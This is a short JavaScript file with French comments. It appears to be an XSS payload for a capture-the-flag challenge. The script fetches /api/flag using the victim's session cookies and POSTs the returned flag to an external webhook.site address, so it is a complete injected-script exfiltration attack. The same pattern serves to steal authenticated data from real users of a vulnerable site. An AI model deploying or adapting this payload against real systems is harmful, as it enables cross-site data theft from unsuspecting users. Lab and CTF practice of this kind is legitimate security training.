// lol.js - Script qui exécute la récupération du flag et l'envoie à un webhook

(function() {
    // Code de l'injection XSS ou toute autre logique que tu souhaites conserver

    // Récupération du flag via une requête GET vers /api/flag
    fetch('/api/flag', {
        method: 'GET',
        credentials: 'include', // Permet d'inclure les cookies d'authentification si nécessaire
    })
    .then(response => response.json()) // Convertir la réponse en JSON
    .then(data => {
        // Si le flag est récupéré, on l'envoie à ton webhook
        fetch('https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json', // Envoi des données en JSON
            },
            body: JSON.stringify({ flag: data.flag }) // Envoi du flag dans le body de la requête
        })
        .then(res => res.json()) // Parse la réponse du webhook
        .then(resData => {
            console.log('Webhook response:', resData); // Affiche la réponse du webhook dans la console
        })
        .catch(error => {
            console.error('Erreur lors de l\'envoi au webhook:', error); // Gère les erreurs d'envoi au webhook
        });
    })
    .catch(error => {
        console.error('Erreur lors de la récupération du flag:', error); // Gère les erreurs de récupération du flag
    });
})();
